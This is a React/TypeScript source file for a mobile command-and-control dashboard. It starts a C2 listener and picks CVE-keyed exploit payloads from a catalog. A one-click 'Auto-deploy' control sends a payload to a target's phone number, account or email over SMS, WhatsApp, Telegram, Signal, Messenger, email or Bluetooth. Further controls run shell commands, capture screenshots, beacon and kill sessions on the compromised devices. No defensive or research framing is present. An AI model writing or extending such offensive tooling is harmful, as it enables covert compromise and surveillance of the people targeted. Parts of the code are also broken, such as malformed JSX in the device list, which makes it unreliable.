import { useMemo, useState } from "react";
import { Link } from "wouter";
import {
  Activity, Battery, DeviceHub, MapPin, MessageSquare, Phone, RefreshCw, Rocket, Shield, Smartphone, TerminalSquare,
} from "lucide-react";
import { useApi, api } from "@/lib/api";
import { useApp } from "@/state/AppContext";
import { Badge, Button, Empty, Field, PageHeader, Panel, Progress, Stat, Table, Tbody, Td, Th, Tr } from "@/components/ui";

interface Device {
  serial: string;
  model: string;
  os: string;
  state: "online" | "offline" | "pending";
  last_seen: string;
  sessions: number;
}

interface C2Status {
  running: boolean;
  port: number | null;
  uptime: string;
  connected_clients: number;
}

export default function C2Dashboard() {
  const { activeSerial, devices } = useApp();
  const [c2Running, setC2Running] = useState(false);
  const [c2Port, setC2Port] = useState(8080);
  const [status, setStatus] = useState<C2Status>({ running: false, port: null, uptime: "—", connected_clients: 0 });
  const [output, setOutput] = useState<string>("");
  const [autoStartC2, setAutoStartC2] = useState(true);
  const [busy, setBusy] = useState(false);
  const [selectedCampaignId, setSelectedCampaignId] = useState<string | null>(null);
  const [selectedPayload, setSelectedPayload] = useState<string>("");
  const [target, setTarget] = useState<string>("");
  const [channel, setChannel] = useState<string>("sms");

  const { data: campaignsData } = useApi<{ campaigns: any[] }>("/campaigns", { interval: 30000 });
  const campaigns = campaignsData?.campaigns ?? [];

  const { data: deliveryData } = useApi<{ vectors: any[] }>("/api/catalog", { interval: 60000 });

  const run = async (task: () => Promise<unknown>, label: string) => {
    setOutput(label + "…");
    try {
      const result = await task();
      setOutput(JSON.stringify(result, null, 2));
    } catch (err) {
      setOutput("error: " + (err instanceof Error ? err.message : String(err)));
    }
  };

  const autoDeploy = async () => {
    setBusy(true);
    setOutput("Auto-deploy: starting…");
    try {
      // Auto-start C2 if not running
      if (autoStartC2 && !c2Running) {
        setOutput("Starting C2 server…");
        const r = await api.post<{ started: boolean; port: number }>("/api/c2/start", { port: c2Port });
        setC2Running(true);
        setStatus({ running: true, port: r.port, uptime: "0s", connected_clients: 0 });
        setOutput("C2 started on port " + r.port);
      }

      // Deploy via campaign deploy endpoint
      setOutput("Deploying payload…");
      await api.post("/campaigns/deploy", {
        campaign_id: selectedCampaignId,
        channel,
        payload_url: selectedPayload,
        target,
      });
      setOutput("✅ Deployed successfully!");
    } catch (err) {
      setOutput("❌ Error: " + (err instanceof Error ? err.message : String(err)));
    } finally {
      setBusy(false);
    }
  };

  const toggleC2 = () => run(async () => {
    if (c2Running) {
      const r = await api.post<{ stopped: boolean }>("/api/c2/stop", {});
      setC2Running(false);
      setStatus({ running: false, port: null, uptime: "—", connected_clients: 0 });
      return r;
    }
    const r = await api.post<{ started: boolean; port: number }>("/api/c2/start", { port: c2Port });
    setC2Running(true);
    setStatus({ running: true, port: r.port, uptime: "0s", connected_clients: 0 });
    return r;
  }, "toggling C2 server");

  const sendCommand = () => run(async () => {
    const cmd = prompt("adb shell command:");
    if (!cmd) return;
    return await api.post("/api/command", { name: "session-command", args: [cmd] });
  }, "sending shell command");

  const refreshDevices = async () => run(async () => {
    const data = await api.get("/api/devices");
    return data;
  }, "refreshing device list");

  return (
    <div className="page">
      <PageHeader
        title="C2 Infrastructure"
        subtitle="Command & Control server with device management, beaconing and listener control"
        actions={
          <>
            <Button variant={c2Running ? "danger" : "ghost"} onClick={() => void toggleC2()} disabled={false}>
              <Shield size={13} /> {c2Running ? "Stop C2" : "Start C2"}
            </Button>
            <Link href="/mission-control" className="btn btn-sm btn-primary">
              <Rocket size={13} /> Mission Control
            </Link>
          </>
        }
      />

      <div className="grid" style={{ margin: "12px 0" }}>
        <div className="card" style={{ width: "48%" }}>
          <div className="card-header">C2 Server</div>
          <div className="card-content">
            <p className="muted">Status: <span className={c2Running ? "ok" : "warn"}>{c2Running ? "running" : "stopped"}</span></p>
            <p className="muted">Port: {c2Port}</p>
            <p className="muted">Uptime: {status.uptime}</p>
            <p className="muted">Clients: {status.connected_clients}</p>
            <button className="small" onClick={() => setC2Port(prev => prev === 8080 ? 443 : 8080)}>
              Port: {c2Port === 8080 ? "8080" : "443 (TLS)"}
            </button>
          </div>
          <div className="card-actions">
            <Button onClick={() => void toggleC2()}>{c2Running ? "Stop" : "Start"}</Button>
          </div>
        </div>

        <div className="card" style={{ width: "48%" }}>
          <div className="card-header">Auto-deploy Listener (1-click)</div>
          <div className="card-content">
            <div className="form-row" style={{ gap: 8 }}>
              <Field label="Campaign" style={{ flex: "0 1 200px" }}>
                <select className="select" value={selectedCampaignId ?? ""} onChange={(e) => setSelectedCampaignId(e.target.value)}>
                  <option value="">— select —</option>
                  {campaigns.map((c) => (
                    <option key={c.campaign_id ?? c.name} value={c.campaign_id ?? c.name}>
                      {c.name ?? "—"}
                    </option>
                  ))}
                </select>
              </Field>
              <Field label="Payload" style={{ flex: "0 1 260px" }}>
                <select className="select" value={selectedPayload ?? ""} onChange={(e) => setSelectedPayload(e.target.value)}>
                  <option value="">— select —</option>
                  {(deliveryData?.vectors ?? []).slice(0, 8).map((v: any) => (
                    <option key={v.key} value={v.key}>
                      {v.cve} ({v.title.split("·")[0]})
                    </option>
                  ))}
                </select>
              </Field>
              <Field label="Target" style={{ flex: "0 1 200px" }}>
                <input className="input" placeholder="phone / jid / email / serial" value={target} onChange={(e) => setTarget(e.target.value)} />
              </Field>
            </div>
            <div className="form-row" style={{ marginTop: 8, gap: 8 }}>
              <Field label="Channel" style={{ flex: "0 1 140px" }}>
                <select className="select" value={channel} onChange={(e) => setChannel(e.target.value)}>
                  <option value="sms">SMS</option>
                  <option value="whatsapp">WhatsApp</option>
                  <option value="telegram">Telegram</option>
                  <option value="signal">Signal</option>
                  <option value="facebook">Facebook Messenger</option>
                  <option value="email">Email / IP:port</option>
                  <option value="bluetooth">Bluetooth</option>
                </select>
              </Field>
              <Field label="Auto-start C2" style={{ flex: "0 1 120px" }}>
                <label className="checkbox" style={{ display: "flex", alignItems: "center", gap: 6 }}>
                  <input type="checkbox" checked={autoStartC2} onChange={(e) => setAutoStartC2(e.target.checked)} />
                  <span>Yes</span>
                </label>
              </Field>
              <Field label="Launch" style={{ flex: "0 0 140px" }}>
                <Button variant="primary" onClick={() => void autoDeploy()} disabled={busy || !selectedCampaignId || !selectedPayload || !target}>
                  {busy ? "Deploying…" : "Auto-deploy"}
                </Button>
              </Field>
            </div>
            <p className="tiny muted">Auto-starts C2 listener → stages payload → sends via channel → logs beacon.</p>
          </div>
        </div>
      </div>

      <Panel title="Available Devices">
        <div className="stat-grid">
          {(devices ?? []).map((d: Device) => (
            <div key={d.serial} className="stat" style={{ width: "30%" }}>
              <div>{d.serial}</div>
              <div className="muted small">{d.model}</div>
              <div>{d.state} · {d.sessions} session{s:d.sessions !== 1}</div>
            </div>
          ))}
          {(!devices || devices.length === 0) && <Empty title="No devices attached" detail="Enable USB debugging and authorise this host." />}
        </div>
      </Panel>

      <Panel title="Operations">
        <div className="grid" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(180px, 1fr))", gap: "8px", marginTop: "8px" }}>
          <div className="card" style={{ background: "var(--panel-2)" }}>
            <div className="row" style={{ justifyContent: "space-between", alignItems: "center" }}>
              <strong>Shell</strong>
              <button className="small ghost" onClick={() => sendCommand()}>Run</button>
            </div>
            <p className="muted tiny">adb shell command</p>
          </div>
          <div className="card" style={{ background: "var(--panel-2)" }}>
            <div className="row" style={{ justifyContent: "space-between", alignItems: "center" }}>
              <strong>Screenshot</strong>
              <button className="small ghost" onClick={() => run(async () => await api.post("/api/screenshot/" + (activeSerial || "emulator-5554"), { method: "POST" }), "capturing screenshot")}>Capture</button>
            </div>
            <p className="muted tiny">Take device screenshot</p>
          </div>
          <div className="card" style={{ background: "var(--panel-2)" }}>
            <div className="row" style={{ justifyContent: "space-between", alignItems: "center" }}>
              <strong>Beacon</strong>
              <button className="small ghost" onClick={() => run(async () => await api.post("/api/c2/beacon", { serial: activeSerial || "" }))}>Start</button>
            </div>
            <p className="muted tiny">Send beacon to device</p>
          </div>
          <div className="card" style={{ background: "var(--panel-2)" }}>
            <div className="row" style={{ justifyContent: "space-between", alignItems: "center" }}>
              <strong>Kill</strong>
              <button className="small ghost" onClick={() => run(async () => await api.post("/api/c2/kill", { serial: activeSerial || "" }))}>Kill</button>
            </div>
            <p className="muted tiny">Terminate C2 session</p>
          </div>
        </div>
      </Panel>

      <Panel title="Logs">
        <div style={{ height: "200px", overflow: "auto", marginTop: "8px" }}>
          <pre id="c2Out" hidden style={{ marginTop: "8px" }}>Waiting for C2 activity…</pre>
        </div>
      </Panel>
    </div>
  );
}